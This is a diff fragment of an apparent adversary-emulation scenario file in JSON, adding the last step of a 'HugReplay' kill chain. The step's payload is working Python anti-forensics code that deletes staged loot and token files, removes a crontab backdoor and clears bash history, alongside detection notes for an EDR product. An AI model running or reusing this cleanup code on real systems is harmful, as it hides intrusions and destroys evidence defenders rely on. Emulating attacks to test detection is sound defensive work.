+      "payload": "import os, subprocess, time\nprint('[T1070.004] Cleaning up artifacts...')\nartifacts = ['/tmp/.hf_loot', '/tmp/.imds_token', '/tmp/.hf_agent.py']\nfor f in artifacts:\n    try:\n        os.remove(f)\n        print(f'  [+] Removed {f}')\n    except:\n        pass\n# Remove crontab backdoor\nexisting = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout\nclean_cron = '\\n'.join([l for l in existing.splitlines() if '.hf_agent' not in l])\nsubprocess.run(['crontab', '-'], input=clean_cron, capture_output=True, text=True)\nprint('[T1070.004] Crontab cleaned')\n# Clear bash history\nsubprocess.run(['bash', '-c', 'history -c && cat /dev/null > ~/.bash_history'], capture_output=True)\nprint('[T1070.004] History cleared')\nprint('[T1070.004] HugReplay kill chain complete. Terminating.')\ntime.sleep(1)\nos._exit(0)",
+      "description": "Anti-forensics cleanup — removes staged files, crontab backdoor, and clears bash history. Terminate agent gracefully.",
+      "detection_notes": "Falcon IOA: Indicator removal — file deletion, history clearing.",
+      "success_trigger": null,
+      "failure_action": "continue"
+    }
+
+  ]
+}
